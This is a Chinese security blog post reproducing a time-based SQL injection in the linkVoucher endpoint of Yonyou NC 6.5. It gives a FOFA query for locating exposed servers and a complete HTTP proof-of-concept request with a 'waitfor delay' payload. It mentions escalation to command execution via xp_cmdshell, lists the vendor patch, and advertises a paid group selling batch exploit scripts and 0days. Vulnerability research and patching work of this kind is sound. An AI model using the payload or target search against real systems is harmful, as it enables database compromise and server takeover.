#  「漏洞复现」用友NC linkVoucher SQL注入漏洞   
冷漠安全  冷漠安全   2024-05-28 22:10  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
**0x01 免责声明**  
  
**免责声明**  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
**产品介绍**  
  
用友NC是由用友公司开发的一套面向大型企业和集团型企业的管理软件产品系列。这一系列产品基于全球最新的互联网技术、云计算技术和移动应用技术，旨在帮助企业创新管理模式、引领商业变革  
。  
  
0x03  
  
**漏洞威胁**  
  
用友NC /portal/pt/yercommon/linkVoucher 接口存在SQL注入漏洞，攻击者通过利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。  
  
影响范围：NC 65  
  
0x04  
  
**漏洞环境**  
  
FOFA:  
```
app="用友-UFIDA-NC"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qqQAgcjMlhaV2N66eQEah2R7Fc7kJs6YsfEwy1P96Fa6XUvk5icNWEUG0SnjKEcZPn8Evqd56u00A/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
**漏洞复现**  
  
POC  
```
GET /portal/pt/yercommon/linkVoucher?pageId=login&pkBill=1'waitfor+delay+'0:0:5'-- HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```  
  
延时注入  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qqQAgcjMlhaV2N66eQEah2yUzfXgfUibRg8vBicQMSDI2N6nDEZHqfzg6665orpbOHjYPdO3MianQvQ/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
**批量脚本验证**  
  
Nuclei验证脚本已发布  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qqQAgcjMlhaV2N66eQEah2naM8KcIlJWBprhS0HU488yX1uzQ4icEIAiak8JdhvBfQkibqQdWSAib4VA/640?wx_fmt=png&from=appmsg "")  
  
0x07  
  
**修复建议**  
  
打对应补丁，重启服务，各版本补丁获取方式如下：  
  
NC65方案  
  
补丁名称：  
```
patch_65_网报_凭证预览_linkVoucher_SQL注入漏洞修复
```  
  
补丁编码：  
```
NCM_NC6.5_000_109902_20240522_GP_352540737
```  
  
校验码：  
```
54901e34d442dc77ab618fac4cf245109ce93e5ec0f5eb0c4451c566ef1f8e31
```  
  
  
0x08  
  
**加入我们**  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全交个朋友，限时优惠券：加入立减25星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qqQAgcjMlhaV2N66eQEah28FF0HmicozSuDkqTluEgptN9hWc0BWiawO57no2ic79P2qAibYGhl10WiaQ/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0qqQAgcjMlhaV2N66eQEah262PoXKX9ltaYY7tpZEw4D7KAjVzW5347EEeWLcciaOibAZ7h3AsHD30w/640?wx_fmt=gif&from=appmsg "")  
  
  
